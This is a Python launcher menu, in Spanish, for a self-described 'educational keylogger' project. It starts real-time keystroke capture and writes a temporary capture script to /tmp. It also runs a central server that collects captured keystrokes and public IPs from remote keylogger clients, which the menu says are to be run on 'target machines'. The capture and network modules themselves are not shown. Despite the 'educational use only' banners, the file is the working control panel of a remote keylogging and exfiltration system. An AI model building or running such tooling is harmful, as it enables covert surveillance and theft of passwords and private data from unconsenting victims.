#!/usr/bin/env python3
"""
KEYLOGGER EDUCATIVO - LAUNCHER PRINCIPAL
Autor: Alvaro Manzo

EJECUTA ESTE ARCHIVO PARA USAR EL KEYLOGGER
"""

import os
import sys
import time
from pathlib import Path

# Colores
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'
    BG_RED = '\033[41m'
    BG_GREEN = '\033[42m'

def print_main_banner():
    """Banner principal"""
    os.system('clear' if os.name != 'nt' else 'cls')
    print(f"""
{Colors.RED}{Colors.BOLD}
╔═══════════════════════════════════════════════════════════════╗
║            🚀 KEYLOGGER EDUCATIVO - LAUNCHER 🚀               ║
║                   TODO EN UNO - FÁCIL USO                    ║
╚═══════════════════════════════════════════════════════════════╝
{Colors.END}

{Colors.BG_RED}{Colors.WHITE}{Colors.BOLD} ⚠️  SOLO USO EDUCATIVO Y SISTEMAS PROPIOS ⚠️ {Colors.END}

{Colors.GREEN}🎯 CARACTERÍSTICAS PRINCIPALES:{Colors.END}
├── 📝 {Colors.CYAN}CAPTURA EN TIEMPO REAL{Colors.END} - Ve exactamente lo que se escribe
├── 🔍 {Colors.CYAN}VISUALIZACIÓN CLARA{Colors.END} - Datos organizados y legibles  
├── 📊 {Colors.CYAN}ANÁLISIS COMPLETO{Colors.END} - Estadísticas detalladas
├── 🌐 {Colors.CYAN}DASHBOARD WEB{Colors.END} - Interfaz gráfica moderna
├── 📁 {Colors.CYAN}ARCHIVOS ORGANIZADOS{Colors.END} - Todo bien estructurado
└── 🔐 {Colors.CYAN}ENCRIPTACIÓN SEGURA{Colors.END} - Datos protegidos

{Colors.YELLOW}📂 Estructura del proyecto:{Colors.END}
├── 📁 src/          → Código principal
├── 📁 web/          → Dashboard web  
├── 📁 utils/        → Herramientas
├── 📁 logs/         → Datos capturados
└── 📁 docs/         → Documentación
    """)

def check_dependencies():
    """Verificar dependencias"""
    required = ['pynput', 'cryptography', 'flask']
    missing = []
    
    for module in required:
        try:
            __import__(module)
        except ImportError:
            missing.append(module)
    
    return missing

def run_keylogger():
    """Ejecutar keylogger visual"""
    print(f"\n{Colors.GREEN}🚀 Iniciando Keylogger Visual...{Colors.END}")
    print(f"{Colors.YELLOW}📝 VERÁS TODO LO QUE SE ESCRIBE EN TIEMPO REAL{Colors.END}")
    print(f"{Colors.CYAN}Los datos se guardan automáticamente en logs/{Colors.END}")
    
    input(f"\n{Colors.WHITE}Presiona Enter para continuar...{Colors.END}")
    
    try:
        os.system(f"python3 {Path(__file__).parent}/src/keylogger_visual.py")
    except Exception as e:
        print(f"{Colors.RED}❌ Error: {e}{Colors.END}")

def view_captured_data():
    """Ver datos capturados"""
    print(f"\n{Colors.BLUE}🔍 Abriendo visor de datos...{Colors.END}")
    print(f"{Colors.YELLOW}📊 ANÁLISIS COMPLETO DE LO CAPTURADO{Colors.END}")
    
    try:
        os.system(f"python3 {Path(__file__).parent}/src/data_viewer.py")
    except Exception as e:
        print(f"{Colors.RED}❌ Error: {e}{Colors.END}")

def run_dashboard():
    """Ejecutar dashboard web"""
    print(f"\n{Colors.CYAN}🌐 Iniciando Dashboard Web...{Colors.END}")
    print(f"{Colors.YELLOW}📈 Ve las estadísticas en: http://localhost:5000{Colors.END}")
    
    try:
        os.system(f"python3 {Path(__file__).parent}/web/dashboard.py")
    except Exception as e:
        print(f"{Colors.RED}❌ Error: {e}{Colors.END}")

def show_logs_folder():
    """Mostrar carpeta de logs"""
    logs_dir = Path(__file__).parent / "logs"
    
    print(f"\n{Colors.GREEN}📁 Contenido de la carpeta logs:{Colors.END}")
    
    if logs_dir.exists():
        files = list(logs_dir.glob("*"))
        if files:
            for file in files:
                size = file.stat().st_size if file.is_file() else 0
                file_type = "📄" if file.is_file() else "📁"
                print(f"  {file_type} {Colors.CYAN}{file.name}{Colors.END} ({size} bytes)")
        else:
            print(f"  {Colors.YELLOW}La carpeta está vacía{Colors.END}")
            
        print(f"\n{Colors.BLUE}📍 Ruta completa: {logs_dir.absolute()}{Colors.END}")
    else:
        print(f"  {Colors.RED}❌ La carpeta logs no existe{Colors.END}")

def install_dependencies():
    """Instalar dependencias"""
    print(f"\n{Colors.YELLOW}📦 Instalando dependencias...{Colors.END}")
    
    try:
        install_script = Path(__file__).parent / "install.sh"
        if install_script.exists():
            os.system(f"bash {install_script}")
        else:
            os.system("pip3 install cryptography pynput psutil flask flask-cors qrcode pillow")
        
        print(f"{Colors.GREEN}✅ Dependencias instaladas{Colors.END}")
    except Exception as e:
        print(f"{Colors.RED}❌ Error instalando: {e}{Colors.END}")

def quick_capture():
    """Captura rápida - 2 minutos"""
    print(f"\n{Colors.GREEN}⚡ CAPTURA RÁPIDA - 2 MINUTOS{Colors.END}")
    print(f"{Colors.YELLOW}Perfecto para pruebas rápidas{Colors.END}")
    print(f"{Colors.CYAN}📝 Escribe algo y ve cómo se captura en tiempo real{Colors.END}")
    
    input(f"\n{Colors.WHITE}Presiona Enter para iniciar...{Colors.END}")
    
    # Crear un script temporal para captura limitada
    temp_script = f"""
import sys
sys.path.append('{Path(__file__).parent}/src')
from keylogger_visual import KeyloggerVisual
import threading
import time

keylogger = KeyloggerVisual()
keylogger.running = True
keylogger.stats['start_time'] = time.time()

print("\\n🔥 CAPTURA RÁPIDA INICIADA - 2 MINUTOS")
print("📝 Escribe algo y observa la captura...")

# Timer para detener después de 2 minutos
def stop_after_timeout():
    time.sleep(120)  # 2 minutos
    keylogger.running = False
    print("\\n⏰ Tiempo terminado - Captura detenida")

timer = threading.Thread(target=stop_after_timeout, daemon=True)
timer.start()

try:
    keylogger.start_capture()
except KeyboardInterrupt:
    pass
"""
    
    try:
        with open("/tmp/quick_capture.py", "w") as f:
            f.write(temp_script)
        os.system("python3 /tmp/quick_capture.py")
        os.remove("/tmp/quick_capture.py")
    except Exception as e:
        print(f"{Colors.RED}❌ Error en captura rápida: {e}{Colors.END}")

def run_central_server():
    """Ejecutar servidor central para recibir múltiples keyloggers"""
    print(f"\n{Colors.PURPLE}🌐 SERVIDOR CENTRAL - CONTROL DE MÚLTIPLES KEYLOGGERS{Colors.END}")
    print(f"{Colors.GREEN}🎯 ¿Qué hace?{Colors.END}")
    print(f"├── ✅ Recibe conexiones de múltiples keyloggers")
    print(f"├── ✅ Muestra la IP PÚBLICA REAL de cada máquina")
    print(f"├── ✅ Panel web para monitoreo en tiempo real")
    print(f"└── ✅ Control centralizado desde tu máquina")
    
    print(f"\n{Colors.YELLOW}📡 El servidor te dará:{Colors.END}")
    print(f"├── 🌍 Tu IP pública (para configurar clientes)")
    print(f"├── 🔌 Puerto de conexión")
    print(f"└── 🌐 Panel web en http://localhost:5000")
    
    input(f"\n{Colors.WHITE}Presiona Enter para iniciar el servidor...{Colors.END}")
    
    try:
        os.system(f"python3 {Path(__file__).parent}/src/central_server.py")
    except Exception as e:
        print(f"{Colors.RED}❌ Error: {e}{Colors.END}")

def run_remote_client():
    """Ejecutar cliente remoto"""
    print(f"\n{Colors.CYAN}📡 CLIENTE REMOTO - ENVÍA IP PÚBLICA AL SERVIDOR{Colors.END}")
    print(f"{Colors.GREEN}🎯 ¿Qué hace?{Colors.END}")
    print(f"├── ✅ Se conecta a tu servidor central")
    print(f"├── ✅ Envía su IP PÚBLICA REAL (no 192.168.x.x)")
    print(f"├── ✅ Transmite datos capturados en tiempo real")
    print(f"└── ✅ Reconexión automática si se pierde conexión")
    
    print(f"\n{Colors.YELLOW}📋 Necesitarás:{Colors.END}")
    print(f"├── 🌐 IP pública del servidor (obtenida del servidor central)")
    print(f"└── 🔌 Puerto del servidor (por defecto 9999)")
    
    input(f"\n{Colors.WHITE}Presiona Enter para iniciar el cliente...{Colors.END}")
    
    try:
        os.system(f"python3 {Path(__file__).parent}/src/remote_keylogger.py")
    except Exception as e:
        print(f"{Colors.RED}❌ Error: {e}{Colors.END}")

def setup_remote_system():
    """Configurar sistema remoto automáticamente"""
    print(f"\n{Colors.CYAN}⚙️ CONFIGURADOR AUTOMÁTICO DEL SISTEMA REMOTO{Colors.END}")
    print(f"{Colors.GREEN}🔧 Este configurador:{Colors.END}")
    print(f"├── 📦 Instala todas las dependencias necesarias")
    print(f"├── 🚀 Crea launchers rápidos (start_server.py y start_client.py)")  
    print(f"├── 📖 Genera documentación completa")
    print(f"└── ✅ Prepara todo para usar el sistema remoto")
    
    print(f"\n{Colors.YELLOW}📋 Después podrás:{Colors.END}")
    print(f"├── 🖥️ Ejecutar 'python3 start_server.py' en TU máquina")
    print(f"├── 📱 Ejecutar 'python3 start_client.py' en máquinas objetivo")
    print(f"└── 🌐 Ver todas las IPs públicas en http://localhost:5000")
    
    response = input(f"\n{Colors.WHITE}¿Proceder con la configuración? (s/N): {Colors.END}").lower()
    
    if response in ['s', 'si', 'y', 'yes']:
        try:
            os.system(f"python3 {Path(__file__).parent}/setup_remote.py")
        except Exception as e:
            print(f"{Colors.RED}❌ Error en configuración: {e}{Colors.END}")
    else:
        print(f"{Colors.YELLOW}Configuración cancelada{Colors.END}")

def main_menu():
    """Menú principal"""
    while True:
        print_main_banner()
        
        # Verificar dependencias
        missing = check_dependencies()
        if missing:
            print(f"\n{Colors.RED}⚠️ FALTAN DEPENDENCIAS: {', '.join(missing)}{Colors.END}")
            print(f"{Colors.YELLOW}Usa la opción 7 para instalarlas{Colors.END}")
        else:
            print(f"\n{Colors.GREEN}✅ Todas las dependencias están instaladas{Colors.END}")
        
        print(f"\n{Colors.BOLD}🎮 MENÚ PRINCIPAL:{Colors.END}")
        print(f"\n{Colors.BG_GREEN}{Colors.WHITE} CAPTURA Y ANÁLISIS {Colors.END}")
        print(f"{Colors.GREEN}1.{Colors.END} 🔥 {Colors.BOLD}KEYLOGGER VISUAL{Colors.END} - Captura en tiempo real")
        print(f"{Colors.BLUE}2.{Colors.END} 📊 {Colors.BOLD}VER DATOS CAPTURADOS{Colors.END} - Análisis completo")
        print(f"{Colors.YELLOW}3.{Colors.END} ⚡ {Colors.BOLD}CAPTURA RÁPIDA{Colors.END} - Prueba de 2 minutos")
        
        print(f"\n{Colors.BG_GREEN}{Colors.WHITE} VISUALIZACIÓN WEB {Colors.END}")
        print(f"{Colors.CYAN}4.{Colors.END} 🌐 {Colors.BOLD}DASHBOARD WEB{Colors.END} - Gráficos interactivos")
        
        print(f"\n{Colors.BG_GREEN}{Colors.WHITE} SISTEMA REMOTO {Colors.END}")
        print(f"{Colors.PURPLE}5.{Colors.END} 🌐 {Colors.BOLD}SERVIDOR CENTRAL{Colors.END} - Recibir IPs públicas")
        print(f"{Colors.WHITE}6.{Colors.END} 📡 {Colors.BOLD}CLIENTE REMOTO{Colors.END} - Enviar a servidor")
        print(f"{Colors.CYAN}7.{Colors.END} ⚙️ {Colors.BOLD}CONFIGURAR REMOTO{Colors.END} - Setup automático")
        
        print(f"\n{Colors.BG_GREEN}{Colors.WHITE} HERRAMIENTAS {Colors.END}")
        print(f"{Colors.YELLOW}8.{Colors.END} 📁 {Colors.BOLD}VER ARCHIVOS{Colors.END} - Explorar logs guardados")
        print(f"{Colors.BLUE}9.{Colors.END} 🔧 {Colors.BOLD}UTILIDADES{Colors.END} - Herramientas adicionales")
        print(f"{Colors.GREEN}10.{Colors.END} 📦 {Colors.BOLD}INSTALAR DEPENDENCIAS{Colors.END}")
        print(f"{Colors.RED}11.{Colors.END} 🚪 {Colors.BOLD}SALIR{Colors.END}")
        
        try:
            choice = input(f"\n{Colors.CYAN}Selecciona una opción (1-11):{Colors.END} ").strip()
            
            if choice == '1':
                run_keylogger()
            elif choice == '2':
                view_captured_data()
            elif choice == '3':
                quick_capture()
            elif choice == '4':
                run_dashboard()
            elif choice == '5':
                run_central_server()
            elif choice == '6':
                run_remote_client()
            elif choice == '7':
                setup_remote_system()
            elif choice == '8':
                show_logs_folder()
                input(f"\n{Colors.YELLOW}Presiona Enter para continuar...{Colors.END}")
            elif choice == '9':
                show_utils_menu()
            elif choice == '10':
                install_dependencies()
                input(f"\n{Colors.YELLOW}Presiona Enter para continuar...{Colors.END}")
            elif choice == '11':
                print(f"\n{Colors.GREEN}👋 ¡Hasta luego!{Colors.END}")
                print(f"{Colors.CYAN}Recuerda: Solo uso educativo y ético{Colors.END}")
                break
            else:
                print(f"{Colors.RED}❌ Opción inválida{Colors.END}")
                time.sleep(1)
                
        except KeyboardInterrupt:
            print(f"\n\n{Colors.GREEN}👋 ¡Hasta luego!{Colors.END}")
            break
        except Exception as e:
            print(f"{Colors.RED}❌ Error: {e}{Colors.END}")
            time.sleep(2)

def show_utils_menu():
    """Mostrar menú de utilidades"""
    while True:
        print(f"\n{Colors.PURPLE}{Colors.BOLD}🔧 UTILIDADES ADICIONALES{Colors.END}")
        print(f"{Colors.GREEN}1.{Colors.END} 📱 Transfer Utility - Enviar a otros dispositivos")
        print(f"{Colors.BLUE}2.{Colors.END} 🎮 Demo Sistema Local")
        print(f"{Colors.CYAN}3.{Colors.END} 🌐 Demo Sistema Remoto - ¡VER IP PÚBLICA!")
        print(f"{Colors.YELLOW}4.{Colors.END} 📋 Ver documentación")
        print(f"{Colors.RED}5.{Colors.END} ← Volver al menú principal")
        
        choice = input(f"\n{Colors.CYAN}Opción:{Colors.END} ").strip()
        
        if choice == '1':
            try:
                os.system(f"python3 {Path(__file__).parent}/utils/transfer_utility.py")
            except Exception as e:
                print(f"{Colors.RED}❌ Error: {e}{Colors.END}")
        elif choice == '2':
            try:
                os.system(f"python3 {Path(__file__).parent}/utils/demo.py")
            except Exception as e:
                print(f"{Colors.RED}❌ Error: {e}{Colors.END}")
        elif choice == '3':
            try:
                os.system(f"python3 {Path(__file__).parent}/demo_sistema_remoto.py")
            except Exception as e:
                print(f"{Colors.RED}❌ Error: {e}{Colors.END}")
        elif choice == '4':
            docs_dir = Path(__file__).parent / "docs"
            print(f"\n{Colors.BLUE}📚 Documentación disponible:{Colors.END}")
            if docs_dir.exists():
                for doc in docs_dir.glob("*.md"):
                    print(f"  📄 {Colors.CYAN}{doc.name}{Colors.END}")
            
            # Mostrar también las instrucciones del sistema remoto
            instructions = Path(__file__).parent / "INSTRUCCIONES.md"
            if instructions.exists():
                print(f"  📄 {Colors.GREEN}INSTRUCCIONES.md{Colors.END} - Sistema remoto con IP pública")
                
            input(f"\n{Colors.YELLOW}Presiona Enter para continuar...{Colors.END}")
        elif choice == '5':
            break
        else:
            print(f"{Colors.RED}❌ Opción inválida{Colors.END}")

if __name__ == "__main__":
    try:
        main_menu()
    except Exception as e:
        print(f"\n{Colors.RED}❌ Error crítico: {e}{Colors.END}")
        sys.exit(1)
